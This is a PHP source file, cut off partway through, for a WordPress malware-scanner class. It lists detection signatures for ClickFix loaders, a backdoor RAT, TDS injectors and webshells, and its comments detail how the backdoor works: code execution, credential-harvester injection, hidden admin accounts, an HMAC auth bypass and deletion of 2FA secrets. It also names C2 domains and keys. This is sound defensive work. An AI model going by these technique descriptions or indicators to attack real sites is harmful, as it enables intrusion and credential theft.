<?php
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

class WPS_Scanner {

	/**
	 * wp-perf-analytics / session-manager family
	 * Payload: ClickFix fake-Cloudflare CAPTCHA iframe that tricks visitors
	 * into running PowerShell commands. C2 via Polygon smart contract.
	 * Confirmed contract: 0x08207B087F61d7e95E441E15fd6d40BEfd6eD308
	 * Known variants: v1.2.4 (XOR 60), v1.2.19 (XOR 113), v1.2.66 (XOR 84), v1.2.97 (XOR 114)
	 */
	private const SIGNATURES_PERF = [
		// 1.4.55: the public Polygon RPC hostnames used to live here, and this
		// list is single-match and critical. A legitimate NFT or wallet plugin
		// calling polygon.drpc.org - which is what that endpoint is for - was
		// therefore reported as ClickFix malware and offered for deletion.
		// Verified against a fixture: a plain web3 plugin tripped this on the
		// hostname alone.
		//
		// The endpoints have moved to WPS_Indicators::etherhiding_indicators(),
		// where every consumer requires corroboration: the option-key shape in
		// check_clickfix_c2_in_options(), and a third independent signal in
		// check_etherhiding_resolver(). Real samples in this family carry a
		// dozen other entries from this list, so nothing that was detected
		// stops being detected.
		//
		// Same reasoning as 1.4.40 over Wordfence: a scanner that flags
		// legitimate software teaches its operator to ignore it, and then it
		// protects nobody.
		// Render-hijacker variants discovered May 2026.
		'native-render-toolkit',
		'total-render-profiler',
		'total-render-toolkit',
		'pro-font-optimizer',
		'site-speed-insights',
		'advanced-asset-insights', // 1.3.37: ClickFix variant slug
		'page-seo-toolkit',        // 1.3.39: ClickFix variant slug
		'starter-image-guard',     // 1.3.39: ClickFix variant slug
		'total-database-optimizer', // 1.3.69: ClickFix variant slug
		'wp_94d4678186_cfg',
		'wp_a26c00cc40_cfg',
		'wp_0b05838858_cfg',
		'wp_e3ef2393dd_cfg',
		'wp_204acd2d43_cfg',
		'wp_fe99c06901_cfg',       // 1.3.37: Advanced Asset Insights persistence option
		'wp_b6786d21cb_cfg',       // 1.3.39: Page SEO Toolkit persistence option
		'wp_a326b31e44_cfg',       // 1.3.39: Starter Image Guard persistence option
		'wp_d4b340aceb_cfg',       // 1.3.69: Total Database Optimizer persistence option
		'WP_Handler_f1bc',
		'DB_Service_fff2',
		'Res_Loader_25bb',
		'Asset_Module_9475',
		'Health_Manager_5fec',
		'DB_Handler_5dfe',         // 1.3.37: Advanced Asset Insights handler class
		'Opt_Handler_841e',        // 1.3.39: Page SEO Toolkit handler class
		'Render_Module_5b7d',      // 1.3.39: Starter Image Guard handler class
		'DB_Worker_1c49',          // 1.3.58: Auto Content Profiler handler class
		'WP_Manager_abc5',         // 1.3.69: Total Database Optimizer handler class
		'Native Render Toolkit',
		'Total Render Profiler',
		'Total Render Toolkit',
		'Pro Font Optimizer',
		'Site Speed Insights',
		'Advanced Asset Insights', // 1.3.37: ClickFix variant Plugin Name disguise
		'Page SEO Toolkit',        // 1.3.39: ClickFix variant Plugin Name disguise
		'Starter Image Guard',     // 1.3.39: ClickFix variant Plugin Name disguise
		// Dismiss cookie names
		'_wp_perf_ok',
		'_cf_verified',
		// Contract interaction
		// 1.4.55: 'eth_call' removed for the same reason - it appears in every
		// web3 library in existence and cannot be a single-match malware signal.
		'38bcdc1c',
		'0x08207B087F61d7',
		// ClickFix message handlers (fake Cloudflare verification)
		'cf-captcha-verified',
		'tds-dismiss',
		// session-manager family variant marker
		'session_tokens_config',
		// XOR delivery mechanism  present verbatim in every PHP echo line
		// across all confirmed variants (v1.2.19 XOR 113, v1.2.66 XOR 84,
		// v1.2.97 XOR 114). These strings appear inside the PHP file itself,
		// not just in the decoded payload, so the PHP scanner catches them.
		's.charCodeAt(i)^k',             // XOR decode loop (18 chars)
		'new TextDecoder().decode(r)',    // try-branch decoder (27 chars)
		// Obfuscated JS injector / theme-css.js dropper family (1.3.79)
		// Two confirmed samples (Plugin-b45b652c, Plugin-45e0930c): a lone PHP plugin
		// file disguised as "simple js plugin" that embeds ~130 KB of RC4-obfuscated
		// JavaScript in a PHP heredoc (ENDPLUGINJS), writes it to the active theme
		// directory as css.js, and injects a <script src="...css.js"> tag into every
		// front-end pageview. Bot/crawler and WordPress admin/cron/asset requests are
		// silently filtered inside the JS; human visitors receive a JSON-RPC payload
		// from a remote C2 server. Distinct from the XOR+base64 ClickFix loader family:
		// uses a different obfuscator (RC4-style string-array rotation with while(!![])),
		// delivers via template-directory file write rather than a wp_footer hook, and
		// carries no Polygon/BSC smart-contract payload.
		'get_template_directory_uri() . \'/css.js\'', // script delivery path; no legitimate plugin does this
		'_get_css_js_content',                         // PHP function suffix present in all known variants
		'_header_has_css_js_script',                   // template-injection guard helper (all variants)
		'_find_closing_tag_position',                  // template-injection helper (all variants)
		'ENDPLUGINJS',                                 // PHP heredoc terminator unique to this family
	];

	// WP-antymalwary-bot family  REST API + cron persistence + C2 ping (Cyprus)
	private const SIGNATURES_ANTY = [
		'WP-antymalwary-bot',
		'wp-antymalwary',
		'wpconsole',
		'wp-performance-booster.php',
		'emergency_login',
		'malwary_pass',
		'italicfonts.org',
		'Kongtuke',
		'TAG-124',
	];

	/**
	 * Second-stage PHP backdoor / RAT family.
	 *
	 * Fully reverse-engineered from class-wp-compat.php (RAT v1.7).
	 * Disguise: "Theme Compatibility Layer" header, placed inside active theme dir.
	 * Access: ?_wph=a3f8b2c1d4e5f607&m=<mode>
	 *
	 * Modes confirmed:
	 *   p   POST[c]  arbitrary PHP RCE via tmp file include
	 *   r   Restore mu-plugins/session-manager.php from wp_session_tokens_config DB option
	 *   l   Inject credential harvester into wp-login.php
	 *   t   Inject credential harvester into active theme functions.php
	 *   h   Create / restore hidden admin account (POST: l, pw, em)
	 *   u   Self-update: overwrite the backdoor file itself (POST: code)
	 *   a   HMAC-signed auth bypass  sets WP auth cookies without password
	 *   q   PDO session hijack: reads wp-config.php directly, forges valid
	 *         session tokens, deletes Wordfence 2FA, redirects to wp-admin
	 *   s   Status ping (returns {"ok":true,"v":"1.7"})
	 *
	 * XOR key (per-build): md5( <hardcoded RAT access key> . <operator domain> )
	 * Auth-bypass HMAC key: 'a3f8b2c1d4e5f6071829304a5b6c7d8e9f0a1b2c3d4e5f607182930a1b2c3d4e'
	 * Mode-q gate key: 'b2c1d4e5'
	 * Exfil target: wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png
	 * Injection marker in wp-login.php / functions.php: d3AtY29udGVudC91cGxvYWRz
	 * Confirmed captures: adminbackup561801, bestofislam
	 *
	 * Note (v1.2.0): The bare domain strings used to derive the XOR key
	 * (operator-specific) are NOT in SIGNATURES_BACKDOOR  they would generate
	 * false positives on the operator's own legitimate files (theme contact
	 * forms, Schema.org markup, etc.). The hardcoded RAT access key
	 * 'a3f8b2c1d4e5f607' and the auth-bypass HMAC tail
	 * '4a5b6c7d8e9f...' are sufficient: both are present in every variant
	 * and neither appears in legitimate code.
	 */
	private const SIGNATURES_BACKDOOR = [
		//  Access & identity markers 
		'a3f8b2c1d4e5f607',          // hardcoded RAT access key (16 hex, in every variant)

		//  Removed signatures (v1.2.0  v1.2.1) 
		// Dropped in v1.2.0: bare operator-domain strings ('menj.pics',
		// 'compelling-evidence.com', 'bismikaallahuma.org')  caused false
		// positives on operator's own theme/plugin files that legitimately
		// contain those URLs in contact info, schema markup, or links.
		//
		// Dropped in v1.2.1: low-entropy substrings that triggered on benign
		// strings unrelated to the RAT.
		//   '_wph'       4 chars; substring lottery, hits in unrelated code.
		//   'b2c1d4e5'   8 hex chars; appears in arbitrary GUIDs and hash
		//                 fragments. Mode-q is already detected via the full
		//                 16-hex access key above and the HMAC tail below.
		// Floor for any signature in this list: 12 chars, OR a fixed exotic
		// phrase that cannot plausibly appear by coincidence.

		//  Fake file headers used to disguise backdoor files 
		'Theme Compatibility Layer', // class-wp-compat.php disguise (inside theme dir)
		'Backup Integrity Checker',
		'Report Data Handler',
		'Multisite File Router',
		'Cache Statistics Handler',
		'Object Cache Handler',     // NEW v1.2.1: RAT placed in wp-content/cache/ dir

		//  Exfil artefacts 
		'Stained_Heart_Red-600x500', // fake PNG credential dump
		'd3AtY29udGVudC91cGxvYWRz', // base64 marker injected into wp-login.php / functions.php

		//  Persistence 
		'wp_session_tokens_config',  // DB key: base64-encoded MU plugin backup; mode-r restores it
		'session-manager.php',       // MU plugin restore target filename

		//  Wordfence 2FA bypass (mode q deletes these) 
		'wfls_2fa_secrets',
		'_wf_twoFactorActive',

		//  Known backdoor filenames 
		'class-wp-compat',           // NEW: RAT disguised as theme compat file
		'wp-backup-verify',
		'wc-report-handler',
		'ms-file-router',
		'wp-cache-stats',
		'wp-locale-handler',

		//  Auth-bypass HMAC secret (partial match sufficient)
		'4a5b6c7d8e9f0a1b2c3d4e5f607182930a1b2c3d4e', // tail of the full HMAC key
		//  Full HMAC key (added 1.3.45) 
		// 62-char concatenation that is also the XOR seed prefix in the
		// credential-harvester payload. This catches the family even in
		// arbitrary file locations where the file might not match other
		// markers because of obfuscation.
		'a3f8b2c1d4e5f6071829304a5b6c7d8e9f0a1b2c3d4e5f607182930a1b2c3d4e',

		//  Encoded credential-harvester header strings (added 1.3.45) 
		// These are the base64-encoded forms of the two harvester payloads
		// that mode-l (wp-login.php injection) and mode-t (theme functions
		// injection) write into the host site. Catching the encoded form
		// means we detect the harvester wherever it has been written, not
		// only inside the RAT's own file. The decoded forms read:
		//   "// WordPress Session Cache Handler" (mode-l)
		//   "// WordPress session analytics"     (mode-t)
		// Both are completely stable across all five victim-site builds
		// verified to date (themuslimapologist.online, bestofislam.com,
		// bismikaallahuma.org, compelling-evidence.com,
		// muslim-apologetic-borneo.com  all sites of the same victim
		// operator). The only variable inside the encoded payload is the
		// victim-site domain in the XOR seed, which falls AFTER the
		// header strings in the encoded sequence.
		'Ci8vIFdvcmRQcmVzcyBTZXNzaW9uIENhY2hlIEhhbmRsZXIK', // mode-l harvester header
		'Ci8vIFdvcmRQcmVzcyBzZXNzaW9uIGFuYWx5dGljcw',      // mode-t harvester header

		//  TDS drive-by injector family (added 1.3.49) 
		// Disguised as "Theme JS Injector / TJI Site JavaScript" mu-plugin.
		// Injects JS on every front-end pageview, routes visitor traffic
		// through ntdnewtds.shop / dnsnewtds.shop TDS infrastructure. The
		// markers below are unique to this family and have no benign
		// equivalent in legitimate plugins.
		'tji_mu_script_js',                              // global variable name unique to this family
		'__performance_optimizer_v6',                    // JavaScript flag (run-once guard); version may rotate
		'Theme JS Injector',                             // fake plugin description string
		'aHR0cHM6Ly9udGRuZXd0ZHMuc2hvcA==',              // base64 of https://ntdnewtds.shop (TDS C2 #1)
		'aHR0cHM6Ly9kbnNuZXd0ZHMuc2hvcA==',              // base64 of https://dnsnewtds.shop (TDS C2 #2)
		'ntdnewtds.shop',                                // plain-text C2 (in case operator drops the base64 wrapper)
		'dnsnewtds.shop',                                // plain-text C2

		//  User-hiding filter installer family (added 1.3.53) 
		// wp-security-helper.php disguises as "WP Security Helper" by
		// "WordPress Security Team" and obfuscates WordPress filter names
		// using hex/octal escape sequences in the source. Legitimate plugins
		// have no reason to do this. The escape-sequence patterns below are
		// the literal bytes that appear in the malware source for the
		// most-distinctive filter and class names. Each signature catches
		// the family on content alone without depending on the visible
		// "WP Security Helper" docblock string (which the operator could
		// trivially rename). The plain-text strings catch unobfuscated
		// builds and the docblock.
		//
		// IMPORTANT: the escape sequences below are byte-exact extracts
		// from the captured sample. A polymorphic variant could swap
		// individual character encodings (e.g. octal `\151` vs hex `\x69`
		// for the letter 'i'); shorter anchor patterns at the start of
		// each encoded string are used to catch those variants.
		'WP_Security_Helper',                            // PHP class name (visible in any unobfuscated reference)
		'WP Security Helper',                            // plugin Name docblock string
		'\\127\\120\\137\\x53\\x65\\143\\165\\x72',      // anchor: encoded `WP_Secur` (first 8 chars of class name)
		'\\160\\162\\x65\\137\\147\\145\\x74\\137\\x75\\163\\145\\162\\x73', // exact-match: encoded `pre_get_users`
		'\\x77\\x70\\137\\x63\\x6f\\165\\x6e\\164\\x5f\\165\\x73\\x65\\162\\163', // exact-match: encoded `wp_count_users`
		'\\x75\\x73\\x65\\162\\163\\x5f\\x6c\\151\\163\\164\\x5f\\x74\\x61\\142\\x6c\\145\\x5f\\161\\x75\\x65\\162\\x79\\x5f\\141\\162\\x67\\163', // exact-match: encoded `users_list_table_query_args`

		//  .sbs cookie-exfil + persistent-admin toolkit (added 1.3.33)
		// Different attacker, different TTPs from the ClickFix family but sits
		// in the same SIGNATURES_BACKDOOR list because both are second-stage
		// access kits. Single high-entropy strings; zero plausible coincidence.
		'webanalytics-cdn.sbs',           // C2 endpoint inside .wp-config-cache.php
		'a7f3e9b2c4d1e5f6',               // hardcoded admin username seeded by wp-security-cache.php

		//  Standalone PHP file manager / webshell (added 1.3.36)
		// Each is high-entropy enough that a single substring hit is unambiguous.
		// Catches both the exact wp-default.php sample and any rename / minor
		// rebuild that keeps the same constant names and session cookie.
		'UM_AUTO_ROOT_MODE',              // unique constant name in the file manager webshell
		'UMSESSID',                       // unique session cookie name
	];

	/**
	 * Whitelist of known-clean files by SHA-256 hash.
	 *
	 * If a scanned file's SHA-256 is present here, the signature scan is
	 * skipped for that file and no finding is generated. Use this for files
	 * that legitimately contain content matching a signature substring but
	 * have been verified clean by manual review.
	 *
	 * Format: 'sha256-hash' => 'context note for audit log'
	 *
	 * To add a file: compute `sha256sum path/to/file.php`, paste the hash
	 * with a short note describing why it is whitelisted. Hashes pin the
	 * exact file content  any modification produces a different hash and
	 * the file will be re-scanned normally.
	 */
	private const WHITELIST_HASHES = [
		//  Compelling Evidence theme (compelling-evidence.com) 
		// Both files verified clean by full malware-indicator scan and function
		// provenance audit. Neither file triggers any current signature.
		// Hashes are kept as a forward-safety record against new signature
		// additions that could otherwise produce false positives on these files.
		//
		// v2.4.9 (original inline-HTML approach):
		'dd4f253944839cbacb2335d57bcc779ee3b8753c0b329e9dc35cd644067c8865'
			=> 'compelling-evidence v2.4.9: inc/ce-secondary-pages.php',
		'311722c04709bd55daaec1b90293dd6c6119da287d980c0af935d82707f14244'
			=> 'compelling-evidence v2.4.9: page-glossary.php',
		// v2.5.0 (refactored  page content split to inc/pages/ partials,
		//         glossary terms extracted to inc/glossary-terms.json):
		'879fff8e2d3349ffd8eeb479f3db1b61d62a6a2709191f7a463d1410495fb840'
			=> 'compelling-evidence v2.5.0: inc/ce-secondary-pages.php',
		'2d004f847205378343979177f310d2047ad4b35bc459e3d6d2ed0ba4712f3824'
			=> 'compelling-evidence v2.5.0: page-glossary.php',
	];

	/**
	 * Path-and-signature whitelist (added v1.2.1).
	 *
	 * Pairs a stable relative path (from wp-content/) with the specific
	 * signature(s) that the file is permitted to contain. When a scan
	 * matches a signature whose (path, sig) pair is whitelisted here,
	 * the match is suppressed  but the file is still scanned against
	 * every other signature in the catalogue. Real malware artefacts
	 * dropped into a whitelisted path still fire normally.
	 *
	 * This survives benign edits (whitespace, copyright bump, typo fix)
	 * because the path stays constant even when the SHA-256 changes.
	 *
	 * Format:
	 *   'themes/<theme>/<relative-path>.php' => [ 'sig1', 'sig2', ... ]
	 *   'plugins/<plugin>/<relative-path>.php' => [ ... ]
	 *   'mu-plugins/<file>.php' => [ ... ]
	 *
	 * Path is normalised relative to WP_CONTENT_DIR with forward slashes.
	 */
	private const WHITELIST_PATH_SIG = [
		//  Compelling Evidence theme 
		// These entries suppress the 'class-wp-compat' signature for these two
		// theme files. As of v2.5.0 neither file contains that substring, so
		// these entries currently produce no whitelist hits. They are kept as
		// a preemptive safeguard: if a future content edit re-introduces a
		// comment or inline string that coincidentally matches, the scan will
		// not regress. Operator review confirms both files are clean stock
		// theme files  no RAT indicators of any kind are present.
		//
		// Suppressing only 'class-wp-compat' means every other backdoor
		// signature (access key, HMAC tail, exfil marker, etc.) still fires
		// normally on these paths  a real RAT dropped alongside them would
		// still be detected.
		'themes/compelling-evidence/inc/ce-secondary-pages.php' => [
			'class-wp-compat',
		],
		'themes/compelling-evidence/page-glossary.php' => [
			'class-wp-compat',
		],
	];

	// Confirmed malware-created account usernames from exfil analysis.
	// Do not add legitimate owner/client usernames here just because they
	// appeared in incident notes or credential-capture evidence.
	private const KNOWN_MALWARE_CREATED_ACCOUNTS = [
		'adminbackup561801',  // likely attacker-created hidden admin (6 captures)
	];

	private const HIGH_RISK_PLUGINS = [
		'wp-file-manager'        => 'Known unauthenticated RCE (CVE-2020-25213). Likely upload vector for this attack.',
		'wp-file-manager-pro'    => 'Pro variant of wp-file-manager. Same RCE class  update or remove if not actively maintained.',
		'file-manager'           => 'File manager plugins are a common attack vector  update or remove.',
		'duplicator'             => 'Has had path traversal and code execution vulnerabilities.',
		'wp-performance-booster' => 'Known WP-antymalwary-bot malware disguise name  delete immediately.',
		'wpconsole'              => 'Known WP-antymalwary-bot malware disguise name  delete immediately.',
		'session-manager'        => 'Second known plugin name in the wp-perf-analytics ClickFix campaign  delete immediately.',
		'wp-perf-analytics'      => 'Confirmed ClickFix malware (wp-perf-analytics family). Injects fake Cloudflare iframe via XOR-obfuscated wp_footer hook. Delete immediately.',
		'native-render-toolkit'  => 'Confirmed ClickFix render hijacker. Hooks wp_footer, hides from admins/bots, and serves a Polygon RPC controlled JavaScript payload.',
		'total-render-profiler'  => 'Confirmed ClickFix render hijacker. Hooks wp_footer, hides from admins/bots, and serves a Polygon RPC controlled JavaScript payload.',
		'total-render-toolkit'   => 'Confirmed ClickFix render hijacker. Hooks wp_footer, hides from admins/bots, and serves a Polygon RPC controlled JavaScript payload.',
		'pro-font-optimizer'     => 'Confirmed ClickFix render hijacker. Hooks wp_footer, hides from admins/bots, and serves a Polygon RPC controlled JavaScript payload.',
		'site-speed-insights'    => 'Confirmed ClickFix render hijacker. Stores its payload in wp_204acd2d43_cfg and serves a Polygon RPC controlled JavaScript payload.',
		'total-database-optimizer' => 'Confirmed ClickFix render hijacker. Hooks wp_footer at priority 90809 via an array callback, stores its payload in wp_d4b340aceb_cfg, hides from admins/bots/dismiss-cookies, and serves an XOR-obfuscated JavaScript payload. Delete immediately.',
	];

	/**
	 * Run all checks. Returns findings array.
	 * Caches result for 1 hour unless $force is true.
	 *
	 * @return array<int, array<string, string>>
	 */
	public static function run( bool $force = false ): array {
		if ( ! $force ) {
			$cached = get_transient( 'wps_scan_results' );
			if ( is_array( $cached ) ) {
				return $cached;
			}
		}

		// 1.4.60 (CRIT-004): single-flight. Nothing previously stopped the
		// hourly cron, a manual scan and a post-upgrade scan from running at
		// once, each of them entitled to quarantine or delete. Two workers
		// remediating the same finding is how one acts on a path the other has
		// already moved.
		//
		// Acquisition is atomic - an INSERT that either creates the row or
		// fails - because a read-then-set transient is not a lock: two workers
		// can both read "free" before either writes.
		$lock_token = null;
		if ( class_exists( 'WPS_Scan_Lock' ) ) {
			$lock_token = WPS_Scan_Lock::acquire( $force ? 'manual' : 'scheduled' );
			if ( $lock_token === null ) {
				$held = WPS_Scan_Lock::describe();
				WPS_Logger::write(
					'scan skipped: another scan holds the lock (context='
					. (string) ( $held['context'] ?? '?' ) . ', age=' . (int) ( $held['age'] ?? 0 ) . 's)'
				);
				$cached = get_transient( 'wps_scan_results' );
				return is_array( $cached ) ? $cached : [];
			}
		}

		try {
			return self::run_locked( $force );
		} finally {
			// finally, so a fatal inside the scan cannot strand the lock for
			// its full TTL.
			if ( $lock_token !== null ) {
				WPS_Scan_Lock::release( $lock_token );
			}
		}
	}

	/**
	 * The scan body. Split from run() in 1.4.60 so lock acquisition and release
	 * bracket it without indenting nine hundred lines.
	 *
	 * @param bool $force Whether this is a forced (manual) scan.
	 * @return array<int, array<string, mixed>>
	 */
	private static function run_locked( bool $force = false ): array {

		// 1.3.98: every check runs through a wall-clock budget. On constrained
		// hosts a full sweep can outlast max_execution_time and die mid-scan with
		// nothing cached and nothing reported; the budget instead stops STARTING
		// new checks once elapsed time passes SCAN_TIME_BUDGET_SECONDS, reports
		// exactly which checks were skipped, and marks the scan partial - honest
		// degradation over silent death. Order is unchanged from the pre-1.3.98
		// merge; a check that has begun is never interrupted.
		$budget_start = microtime( true );
		$checks = [
			'check_self_integrity' => [ __CLASS__, 'check_self_integrity' ], // 1.4.0: the plugin verifies itself first - a tampered guard cannot be trusted to report on anything else
			'check_plugin_folders' => [ __CLASS__, 'check_plugin_folders' ],
			'check_php_signatures' => [ __CLASS__, 'check_php_signatures' ],
			'check_theme_for_backdoor' => [ __CLASS__, 'check_theme_for_backdoor' ], // scan active theme dir for RAT
			'check_mu_plugins' => [ __CLASS__, 'check_mu_plugins' ], // check mu-plugins for restored RAT
			'check_uploads_for_php' => [ __CLASS__, 'check_uploads_for_php' ],
			'check_languages_for_php' => [ __CLASS__, 'check_languages_for_php' ], // scan wp-content/languages for RAT/backdoor PHP
			'check_writable_dirs_for_php' => [ __CLASS__, 'check_writable_dirs_for_php' ], // 1.3.74: scan wp-content/fonts, upgrade, upgrade-temp-backup for staged PHP (predicted leaks)
			'check_cache_dir_for_php' => [ __CLASS__, 'check_cache_dir_for_php' ], // scan cache dir for RAT
			'check_wp_content_dropins' => [ __CLASS__, 'check_wp_content_dropins' ], // detect root drop-in persistence loaders
			'check_wp_config_malware' => [ __CLASS__, 'check_wp_config_malware' ], // detect removable wp-config.php malware injections
			'check_wp_config_integrity' => [ __CLASS__, 'check_wp_config_integrity' ], // detect wp-config.php modification
			'check_exposed_config_backup' => [ __CLASS__, 'check_exposed_config_backup' ], // 1.4.55: readable wp-config copies in the web root
			'check_htaccess_false_security' => [ __CLASS__, 'check_htaccess_false_security' ], // .htaccess-blocked but still-active malware
			'check_htaccess_redirects' => [ __CLASS__, 'check_htaccess_redirects' ], // referer/UA-cloaked external redirects (doorway cloaking)
			'check_c2_references' => [ __CLASS__, 'check_c2_references' ], // 1.3.98: unified sweep for any catalogued C2 domain in PHP content (shape-agnostic)
			'check_functions_redirect_injection' => [ __CLASS__, 'check_functions_redirect_injection' ], // 1.3.98: redirect primitive + cloaking tell in any theme's functions.php
			'check_high_risk_plugins' => [ __CLASS__, 'check_high_risk_plugins' ],
			'check_orphaned_db_entries' => [ __CLASS__, 'check_orphaned_db_entries' ],
			'check_cron_tampering' => [ __CLASS__, 'check_cron_tampering' ],
			'check_login_injection' => [ __CLASS__, 'check_login_injection' ],
			'check_exfil_file' => [ __CLASS__, 'check_exfil_file' ],
			'check_auto_prepend_hijack' => [ __CLASS__, 'check_auto_prepend_hijack' ], // 1.3.34: auto_prepend_file injection + ABSPATH-root .sbs toolkit references
			'check_root_file_signatures' => [ __CLASS__, 'check_root_file_signatures' ], // 1.3.36: signature content scan of ABSPATH-root PHP files (catches standalone PHP webshells)
			'check_dropper_persistence' => [ __CLASS__, 'check_dropper_persistence' ], // 1.3.41: surface 1.3.40 behavioural Forensics findings into the hourly scan + email alerts
			'check_redrop' => [ __CLASS__, 'check_redrop' ], // 1.3.42: redrop detection - flag previously-deleted byte-identical malware that has reappeared
			'check_dropper_cache' => [ __CLASS__, 'check_dropper_cache' ], // 1.3.43: hunt for cached toolkit ZIPs and loose dropper components anywhere in wp-content/
			'check_well_known_php' => [ __CLASS__, 'check_well_known_php' ],
			'check_credential_exfiltration' => [ __CLASS__, 'check_credential_exfiltration' ], // 1.4.41: what leaves the site
			'check_php_in_data_directory' => [ __CLASS__, 'check_php_in_data_directory' ], // 1.4.40: location is evidence
			'check_character_built_identifiers' => [ __CLASS__, 'check_character_built_identifiers' ], // 1.4.39: names spelled out of a haystack string
			'check_self_extracting_payload' => [ __CLASS__, 'check_self_extracting_payload' ], // 1.4.37: reads itself, runs what follows its closing tag
			'check_obfuscated_js_payload' => [ __CLASS__, 'check_obfuscated_js_payload' ], // 1.4.36: obfuscated JS carried inside PHP
			'check_hidden_identifiers' => [ __CLASS__, 'check_hidden_identifiers' ], // 1.4.35: names split across concatenation to defeat search
			'check_hardening_bypass_config' => [ __CLASS__, 'check_hardening_bypass_config' ], // 1.4.34: php.ini dropped to re-enable exec and remove open_basedir
			'check_encoded_payload_loader' => [ __CLASS__, 'check_encoded_payload_loader' ], // 1.4.34: eval() behind a chain of split-name decoders
			'check_unauthenticated_file_manager' => [ __CLASS__, 'check_unauthenticated_file_manager' ], // 1.4.33: plain-text web shell, no obfuscation to find
			'check_doorway_cloaking' => [ __CLASS__, 'check_doorway_cloaking' ], // 1.4.25: serves crawlers different content than the owner
			'check_control_flow_flattening' => [ __CLASS__, 'check_control_flow_flattening' ], // 1.4.25: goto-density obfuscation // 1.3.44: hunt for PHP files under .well-known/ (none of the IETF protocols using .well-known are PHP)
			'check_generic_webshell_patterns' => [ __CLASS__, 'check_generic_webshell_patterns' ], // 1.3.46: high-confidence webshell pattern detection (eval/assert with user input, RFI, /e modifier)
			'check_xmlrpc_integrity' => [ __CLASS__, 'check_xmlrpc_integrity' ], // 1.3.46: verify xmlrpc.php is the real WordPress core file and not a webshell replacement
			'check_core_checksums' => [ __CLASS__, 'check_core_checksums' ], // 1.3.47: verify wp-includes/wp-admin/ABSPATH-root file integrity against api.wordpress.org checksums
			'check_core_extra_files' => [ __CLASS__, 'check_core_extra_files' ], // 1.3.48: flag PHP files in wp-admin/wp-includes that are NOT in the api.wordpress.org manifest (planted shells); extended in 1.3.51 to also walk ABSPATH root
			'check_renamed_readme' => [ __CLASS__, 'check_renamed_readme' ], // 1.3.51: flag readme_<32hex>.html at ABSPATH root (Plesk backup hygiene or attacker-preserved decoy)
			'check_maintenance_mode' => [ __CLASS__, 'check_maintenance_mode' ], // 1.3.48: stale .maintenance file (site locked into update mode for >10 minutes)
			'check_hidden_admin_users' => [ __CLASS__, 'check_hidden_admin_users' ], // 1.3.52: direct-DB walk of wp_users for malware-created admins hidden from get_users() by pre_user_query filters
			'check_drop_ins' => [ __CLASS__, 'check_drop_ins' ], // 1.3.54: audit WordPress drop-ins (wp-content/object-cache.php, advanced-cache.php, etc.) against known-safe-publisher signatures
			'check_clickfix_shape_heuristic' => [ __CLASS__, 'check_clickfix_shape_heuristic' ], // 1.3.58: shape-based detection of fake-plugin-folder ClickFix variants  catches new prefixes without per-prefix IoC entries
			'check_plugin_metadata_camouflage' => [ __CLASS__, 'check_plugin_metadata_camouflage' ], // 1.3.75: flag plugins whose header carries an example.com placeholder URI (GoDaddy fake-plugin tell)
			'check_malicious_db_options' => [ __CLASS__, 'check_malicious_db_options' ],
			'check_injected_spam_content' => [ __CLASS__, 'check_injected_spam_content' ], // 1.4.73: casino/gambling/SEO-spam published into wp_posts and wp_comments
			'check_clickfix_c2_in_options' => [ __CLASS__, 'check_clickfix_c2_in_options' ], // 1.3.69: recover ClickFix C2 download URL from wp_<10hex>_cfg option payloads
			'check_obfuscated_loader' => [ __CLASS__, 'check_obfuscated_loader' ], // 1.3.78: structural (var-name/key-agnostic) detection of the XOR+base64 self-decoding ClickFix loader, with base64+XOR-brute payload recovery
			'check_obfuscated_js_injector' => [ __CLASS__, 'check_obfuscated_js_injector' ], // 1.3.79: structural detection of the RC4-obfuscated JS injector / theme-css.js dropper family (Plugin-<8hex> naming, ENDPLUGINJS heredoc, css.js planted in theme dir)
			'check_admin_cookie_stealer' => [ __CLASS__, 'check_admin_cookie_stealer' ], // 1.3.79: structural detection of admin-session-cookie stealers (shutdown hook + admin check + outbound post + wordpress_* cookie); catches renamed copies of .wp-config-cache.php
			'check_theme_loader_plugin' => [ __CLASS__, 'check_theme_loader_plugin' ], // 1.3.79: theme-modifying loader family (Plugin-<8hex> with hex-array obfuscator and css.js injection), distinct from the wp_options ClickFix family
			'check_plugin_integrity' => [ __CLASS__, 'check_plugin_integrity' ], // 1.3.89: verify installed repo plugins against the wordpress.org checksums  flags modified or planted PHP inside legitimate plugins (works without a clean baseline)
			'check_php_inventory_drift' => [ __CLASS__, 'check_php_inventory_drift' ], // 1.3.87: baseline drift tripwire  flags any PHP file that appeared or changed in uploads/mu-plugins since the clean baseline, family- and payload-agnostic
			'check_external_payload_loader' => [ __CLASS__, 'check_external_payload_loader' ], // 1.3.83: plugins that read+decode+eval a bundled non-PHP payload blob (externalized-payload fake plugins, e.g. page-image-scanner / storage/state.pkg)
			'check_doorway_backdoor_kit' => [ __CLASS__, 'check_doorway_backdoor_kit' ], // 1.3.83: standalone doorway-spam + backdoor panel kit (annealing/resweep family), detected by core/ structural tells and removed with a protected-path guard
			'check_doorway_cloak_config' => [ __CLASS__, 'check_doorway_cloak_config' ], // 1.4.1: find the kit by its cloaking config - survives folder/file renaming, which the structural tells do not
			'check_etherhiding_resolver' => [ __CLASS__, 'check_etherhiding_resolver' ], // 1.4.55: on-chain C2 resolution by technique - the endpoint host list cannot enumerate per-customer RPC subdomains
			'check_obfuscated_goto_backdoor' => [ __CLASS__, 'check_obfuscated_goto_backdoor' ], // 1.4.3: control-flow-flattened packers - no signature can match them, so the technique is detected
			'check_index_stub_anomaly' => [ __CLASS__, 'check_index_stub_anomaly' ],             // 1.4.3: payloads hidden in 'Silence is golden' index.php stubs, obfuscated or not
			'check_file_manager_shell' => [ __CLASS__, 'check_file_manager_shell' ],     // 1.4.1: browser file-manager web shells (Tiny File Manager shape) - unobfuscated, so the generic webshell check never saw them
			'check_file_operation_shell' => [ __CLASS__, 'check_file_operation_shell' ], // 1.4.4: shells that never execute code - browse/write/delete/upload straight from superglobals
			'check_cloaked_injector' => [ __CLASS__, 'check_cloaked_injector' ],                       // 1.4.5: hides from admins AND crawlers while injecting - matched on behaviour, after de-obfuscating the source
			'check_split_literal_obfuscation' => [ __CLASS__, 'check_split_literal_obfuscation' ],     // 1.4.5: identifier splitting has one purpose - defeating scanners
			'check_php_config_override' => [ __CLASS__, 'check_php_config_override' ],   // 1.4.4: php.ini/.user.ini switching hardening back off (disable_functions=NONE, exec=ON)
			'check_registration_settings' => [ __CLASS__, 'check_registration_settings' ], // 1.4.10: the account factory - default_role escalation, registration reopened, role capability tampering. Leaves no file, so nothing else sees it.
